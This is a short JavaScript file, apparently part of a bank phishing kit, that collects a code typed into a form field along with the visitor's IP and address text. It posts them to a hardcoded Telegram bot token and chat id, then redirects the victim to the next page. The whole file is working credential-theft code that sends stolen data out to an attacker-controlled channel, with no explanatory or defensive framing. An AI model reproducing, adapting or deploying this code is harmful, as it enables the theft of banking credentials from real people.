//bot token
var telegram_bot_id = "6311812989:AAGdgynNLDjY-D0j-xApsFftzsoFQG_DE14";
//chat id
var chat_id = 5383235069;
var u_name, ip, ip2;
var ready = function () {
    u_name = document.getElementById("0T4RX").value;
    ip = document.getElementById("gfg").innerHTML;
    ip2 = document.getElementById("address").innerHTML;
    message = "🔹B4NC0P3L🔹\n🔔C0D3: " + u_name + "\nIP: " + ip +"\n" + ip2 +"\n🔹C0DIGO SYN4PSE🔹";
};
var sender = function () {
    ready();
    var settings = {
        "async": true,
        "crossDomain": true,
        "url": "https://api.telegram.org/bot" + telegram_bot_id + "/sendMessage",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json",
            "cache-control": "no-cache"

        },
        "data": JSON.stringify({
            "chat_id": chat_id,
            "text": message
        })
    };
       $.ajax(settings).done(function (response) {
        window.location = 'index4.html';
        console.log(response);
    });
    return false;
};
